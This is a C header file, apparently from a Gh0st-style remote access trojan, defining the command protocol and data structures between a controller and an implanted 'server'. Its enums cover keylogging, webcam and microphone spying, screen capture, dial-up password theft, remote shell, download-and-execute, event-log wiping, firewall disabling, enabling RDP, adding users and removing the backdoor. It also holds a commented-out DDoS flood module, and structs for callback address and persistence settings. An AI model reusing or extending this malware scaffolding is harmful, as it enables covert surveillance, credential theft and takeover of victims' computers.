
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

// BYTE最大也就256
enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送
	
	// 控制端发出的命令
	COMMAND_ACTIVED = 0x00,			// 服务端可以激活开始工作
	COMMAND_LIST_DRIVE,				// 列出磁盘目录
	COMMAND_LIST_FILES,				// 列出目录中的文件
	COMMAND_DOWN_FILES,				// 下载文件
	COMMAND_FILE_SIZE,				// 上传时的文件大小
	COMMAND_FILE_DATA,				// 上传时的文件数据
	COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
	COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
	COMMAND_STOP,					// 传输中止
	COMMAND_DELETE_FILE,			// 删除文件
	COMMAND_DELETE_DIRECTORY,		// 删除目录
	COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
	COMMAND_CREATE_FOLDER,			// 创建文件夹
	COMMAND_RENAME_FILE,			// 文件或文件改名
	COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
	COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件
	
	COMMAND_SCREEN_SPY,				// 屏幕查看
	COMMAND_SCREEN_RESET,			// 改变屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改变算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制
	COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_SCREEN_BLANK,			// 服务端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版

	COMMAND_WEBCAM,					// 摄像头
	COMMAND_WEBCAM_ENABLECOMPRESS,	// 摄像头数据要求经过H263压缩
	COMMAND_WEBCAM_DISABLECOMPRESS,	// 摄像头数据要求原始高清模式
	COMMAND_WEBCAM_RESIZE,			// 摄像头调整分辩率，后面跟两个INT型的宽高
	COMMAND_NEXT,					// 下一步(控制端已经打开对话框)

	COMMAND_KEYBOARD,				// 键盘记录
	COMMAND_KEYBOARD_OFFLINE,		// 开启离线键盘记录
	COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容

	COMMAND_AUDIO,					// 语音监听

	COMMAND_SYSTEM,					// 系统管理（进程，窗口....）
	COMMAND_PSLIST,					// 进程列表
	COMMAND_WSLIST,					// 窗口列表
	COMMAND_DIALUPASS,				// 拨号密码
	COMMAND_KILLPROCESS,			// 关闭进程

	COMMAND_SORT_PROCESS,			//筛选进程
	COMMAND_SORT_WINDOW,			//筛选窗体

	COMMAND_SENDMSG,                //发送消息
	COMMAND_CHANGE_GROUP,			//更改分组
	
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// 会话管理（关机，重启，注销, 卸载）
	COMMAND_REMOVE,					// 卸载后门
	COMMAND_DOWN_EXEC,				// 其它功能 - 下载执行
	COMMAND_UPDATE_SERVER,			// 其它功能 - 下载更新
	COMMAND_CLEAN_EVENT,			// 其它管理 - 清除系统日志
	COMMAND_OPEN_URL_HIDE,			// 其它管理 - 隐藏打开网页
	COMMAND_OPEN_URL_SHOW,			// 其它管理 - 显示打开网页
	COMMAND_RENAME_REMARK,			// 重命名备注
	COMMAND_REPLAY_HEARTBEAT,		// 回复心跳包

	COMMAND_SYSINFO,                //服务器信息
	COMMAND_SEND_SYSINFO,			//获取服务器信息
	COMMAND_SEND_INSTALLINFO,		//获取安装信息
	COMMAND_NET_USER,				//无net添加用户
	COMMAND_GUEST,                  //启用GUEST
	COMMAND_STOPFIRE,               //关闭防火墙
	COMMAND_CHANGE_PORT,            //更改终端端口
	COMMAND_OPEN_PROXY,				//代理
	COMMAND_CLOSE_3389,				//关闭3389
	COMMAND_OPEN_3389,				//开启3389
	COMMAND_DLL_3389,				//可以传输3389dll
	COMMAND_START_MAP,				//开启映射
	COMMAND_CLOSE_PORT,				//关闭映射
	COMMAND_SLIST,					//获取系统用户
	COMMAND_DELUSER,				//删除用户
	COMMAND_NET_CHANGE_PASS,		//更改用户密码
	COMMAND_WTSLIST,				//在线用户
	COMMAND_WTS_Logoff,			    //注销用户
	COMMAND_WTS_Disconnect,			//断开用户
	COMMAND_DISABLEEUSER,
	COMMAND_ACITVEUSER,

//	COMMAND_DDOS_ATTACK,            // DDOS
// 	COMMAND_DDOS_STOP,              // STOP

//	ATTACK_CCFLOOD,     //变异CC
//	ATTACK_IMITATEIE,   //模拟IE
//	ATTACK_LOOPCC,      //轮回CC
//	ATTACK_ICMPFLOOD,   //ICMP
//	ATTACK_UDPFLOOD,    //UDP
//	ATTACK_TCPFLOOD,    //TCP
//	ATTACK_SYNFLOOD,	//SYN
//	ATTACK_BRAINPOWER,  //智能.
//	CUSTOM_TCPSEND=100, //TCP 发包
// 	CUSTOM_UDPSEND,     //UDP 发包

	// 服务端发出的标识
	TOKEN_AUTH = 100,				// 要求验证
	TOKEN_HEARTBEAT,				// 心跳包
	TOKEN_LOGIN,					// 上线包
	TOKEN_DRIVE_LIST,				// 驱动器列表
	TOKEN_FILE_LIST,				// 文件列表
	TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
	TOKEN_FILE_DATA,				// 文件数据
	TOKEN_TRANSFER_FINISH,			// 传输完毕
	TOKEN_DELETE_FINISH,			// 删除完毕
	TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
	TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
	TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
	TOKEN_DATA_CONTINUE,			// 继续传输数据
	TOKEN_RENAME_FINISH,			// 改名操作完成
	TOKEN_EXCEPTION,				// 操作发生异常
	
	TOKEN_BITMAPINFO,				// 屏幕查看的BITMAPINFO
	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
	TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
	TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容


	TOKEN_WEBCAM_BITMAPINFO,		// 摄像头的BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// 摄像头的图像数据
	
	TOKEN_AUDIO_START,				// 开始语音监听
	TOKEN_AUDIO_DATA,				// 语音监听数据

	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据
	
	TOKEN_PSLIST,					// 进程列表
	TOKEN_WSLIST,					// 窗口列表
	TOKEN_DIALUPASS,				// 拨号密码
	TOKEN_SHELL_START,				// 远程终端开始

	TOKEN_SYSINFOLIST,              // 信息列表
	TOKEN_INSTALLINFOLIST,			// 安装信息列表
	TOKEN_ADD_SUCCESS,				// 添加成功
	TOKEN_ADD_ERROR,				// 添加失败
	TOKEN_DEL_SUCCESS,				// 删除用户成功
	TOKEN_DEL_ERROR,				// 删除用户失败
	TOKEN_CHANGE_PSAA_SUCCESS,		// 修改密码成功
	TOKEN_CHANGE_PSAA_ERROR,		// 修改密码失败
	TOKEN_DLL_3389,					// 加载3389失败
	TOKEN_SLIST,					// 枚举系统用户
	TOKEN_WTSLIST,					// 枚举在线用户
	TOKEN_STATE_SUCCESS,			// 更改用户状态成功
	TOKEN_STATE_ERROR,				// 更改用户状态失败
};

//typedef struct DDOS_HEAD
//{
//	CHAR Target[400];    //攻击目标
//	WORD AttackPort;     //攻击端口
//	WORD AttackType;     //攻击类型
//	WORD AttackThread;   //攻击线程
//	WORD AttackTime;     //攻击时间
//	CHAR SendData[2000]; //发送的数据包
//	WORD DataSize;       //数据包大小
//	DWORD ExtendData1;   //附加数据
//	DWORD ExtendData2;   //附加数据
// }ATTACK,*LPATTACK;

//上线结构体
typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	DWORD			dwCPUClockMhz;	// CPU频率
	int				nCPUNumber;		// CPU核数
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
	DWORD			MemSize;		// 内存大小
	DWORD			Speed;		// 网速
	char			SVirus[80];	    // 杀毒软件
    char            RunTime[300];   // 运行时间
	char			UpGroup[50];	// 上线分组
	char			szVersion[32];	// 上线版本
}LOGININFO;

struct MODIFY_DATA
{
	TCHAR szDns[300];		//上线地址
	TCHAR dwPort[32];		//上线端口
	TCHAR szGroup[50];		//上线分组
	TCHAR szVersion[32];	//上线版本
	TCHAR SerName[100];		//服务名称
	TCHAR Serdisplay[128];	//显示名称
	TCHAR Serdesc[256];		//服务描述
	TCHAR szGetGroup[256];	//分组唯一标识
	BOOL  bServer;			//是服务启动
	BOOL  bRuns;			//是写启动项
	BOOL  bRunOnce;			//是否为绿色安装
};

//信息列表结构体
struct tagSystemInfo
{
	char szSystem[128];     //操作系统
	char szCpuInfo[128];   //CPU信息
	char szActiveTime[128]; //活动时间
	char szAntiVirus[128]; //杀毒软件
	char szUserName[128];   //用户名
	char szRemotePort[128]; //远程端口
	DWORD szMemory;         //内存大小 
	DWORD szMemoryFree;     //可用内存 
	DWORD szDriveSize;      //硬盘大小
	DWORD szDriveFreeSize;  //可用硬盘大小
	char szOpenInfo[128];	// 是否双开(是否开启)
};

//安装信息列表结构体
struct tagOnlineInfo
{
	char szrHostB[128]; 		//上线域名B
	char szrInstallTime[128]; 	//安装时间
	char szrSerName[128];		//安装的服务名
};

typedef struct MyTcpKeepAlive   
{   
    DWORD onoff;   
    DWORD keepalivetime;   
    DWORD keepaliveinterval;   
}TCP_KEEP_ALIVE;

#define	MAX_WRITE_RETRY			15 // 重试写入文件次数
#define	MAX_SEND_BUFFER			1024 * 8 // 最大发送数据长度
#define MAX_RECV_BUFFER			1024 * 8 // 最大接收数据长度

#endif // !defined(AFX_MACROS_H_INCLUDED)